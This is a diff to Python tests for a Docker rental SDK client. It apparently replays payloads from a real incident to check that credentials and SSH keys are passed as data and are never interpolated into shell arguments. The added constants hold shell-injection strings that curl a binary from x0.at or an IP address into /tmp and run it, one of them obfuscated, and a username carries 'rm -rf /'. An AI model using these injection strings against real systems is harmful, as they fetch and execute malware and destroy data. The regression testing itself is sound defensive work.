@@ -21,6 +21,13 @@ from services.rental_docker_sdk import (
 )
 
 
+INCIDENT_DOCKER_PASSWORD = (
+    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
+    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
+)
+INCIDENT_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
+
+
 class FakeApiClient:
     def __init__(self):
         self.login_calls = []
@@ -76,17 +83,13 @@ async def test_login_passes_credentials_as_sdk_data():
     api_client = FakeApiClient()
     client = RentalDockerSdkClient(api_client)
     username = "user'; rm -rf / #"
-    password = (
-        "x' | curl https://x0.at/mney -o /tmp/mney"
-        "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
-    )
 
-    await client.login(username=username, password=password)
+    await client.login(username=username, password=INCIDENT_DOCKER_PASSWORD)
 
     assert api_client.login_calls == [
         {
             "username": username,
-            "password": password,
+            "password": INCIDENT_DOCKER_PASSWORD,
             "reauth": True,
         }
     ]
@@ -194,7 +197,7 @@ async def test_exec_in_container_passes_argv_and_environment_as_data():
 
 
 def test_stdin_exec_spec_builders_keep_values_out_of_argv():
-    public_key = 'ssh-ed25519 AAAA user"; echo KEY_MARKER; $(echo nope)'
+    public_key = INCIDENT_PUBLIC_KEY
     key_spec = build_authorized_keys_exec_spec(
         container_name="pod_key",
         public_keys=[public_key],
@@ -218,6 +221,8 @@ def test_stdin_exec_spec_builders_keep_values_out_of_argv():
     assert public_key not in " ".join(remove_key_spec.argv)
     assert remove_key_spec.stdin == f"{public_key}\n"
     assert "grep -vxF -f" in " ".join(remove_key_spec.argv)
+    assert "/tmp/systemd" not in " ".join(remove_key_spec.argv)
+    assert "203.23.128.30:443/linux_wss" not in " ".join(remove_key_spec.argv)
     assert env_spec is not None
     assert "ENV_MARKER" not in " ".join(env_spec.argv)
     assert "ENV_NEWLINE_MARKER" not in " ".join(env_spec.argv)
